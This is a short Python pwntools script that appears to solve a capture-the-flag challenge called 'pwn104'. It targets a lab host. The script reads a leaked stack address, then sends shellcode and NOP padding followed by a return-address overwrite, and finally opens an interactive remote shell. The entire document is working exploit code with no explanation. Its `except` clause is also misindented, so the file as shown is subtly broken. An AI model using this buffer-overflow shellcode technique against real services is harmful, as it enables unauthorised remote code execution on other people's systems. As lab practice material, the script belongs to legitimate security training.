from pwn import *
import traceback as tb

context.arch = "amd64"
local = False

RHOST = "10.10.54.189"
RPORT = 9004
filePath = "./pwn104.pwn104"
local = False

def access(local = False):
    global RHOST, RPORT, filePath
    p = process(filePath) if local else remote(RHOST, RPORT)
    return p

def pwn104():
    global local
    try:
       p = access(local)
       p.recvuntil(b"I'm waiting for you at ")
       leak = int(p.recvline().strip(), 16)
       log.info("Stack segment: {}".format(hex(leak) ) )

       shellcode = asm(shellcraft.sh())
       padAfterShellCode = b"\x90" * (88 - len(shellcode))
       rip = p64(leak)
       ret4Align = p64(0x401016)

       payload = b"".join([ shellcode, padAfterShellCode, ret4Align, rip, ] )
       p.sendline(payload)
       p.interactive() 
     except:
       tb.print_exc()
